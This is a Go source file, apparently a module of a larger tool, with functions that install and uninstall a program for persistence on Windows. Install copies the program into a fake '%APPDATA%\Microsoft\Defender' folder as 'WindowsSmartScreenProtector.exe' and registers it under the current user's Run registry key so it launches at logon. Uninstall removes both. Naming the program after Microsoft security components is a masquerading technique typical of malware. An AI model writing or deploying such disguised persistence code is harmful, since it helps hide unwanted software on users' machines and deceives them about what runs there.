package commands

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"strings"
)

func Uninstall() (bool, error) {
	appdata := os.Getenv("APPDATA")
	filePath := fmt.Sprintf("%v\\%v", appdata, "Microsoft\\Defender\\WindowsSmartScreenProtector.exe")
	dir, _ := SplitPath(filePath)
	err := os.RemoveAll(dir)
	if err != nil {
		return false, err
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return false, err
	}
	defer k.Close()
	err = k.DeleteValue("MicrosoftSmartScreenProtector")
	if err != nil {
		return false, err
	}
	return true, nil
}

func Install(programPath string) (bool, error) {
	appdata := os.Getenv("APPDATA")
	dirPath := fmt.Sprintf("%v\\%v", appdata, "Microsoft\\Defender")
	filePath := fmt.Sprintf("%v\\%v", dirPath, "WindowsSmartScreenProtector.exe")
	err := createPathIfNotExist(dirPath)
	if err != nil {
		return false, err
	}
	_, err = copyFile(programPath, filePath)
	if err != nil {
		return false, err
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return false, err
	}
	defer k.Close()
	err = k.SetStringValue("MicrosoftSmartScreenProtector", filePath)
	if err != nil {
		return false, err
	}
	return true, nil
}

func copyFile(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}

func createPathIfNotExist(path string) (err error) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = os.MkdirAll(path, 0777)
		if err != nil {
			return err
		}
		return nil
	}
	return nil
}

func SplitPath(path string) (dir, file string) {
	i := strings.LastIndex(path, "\\")
	return path[:i+1], path[i+1:]
}
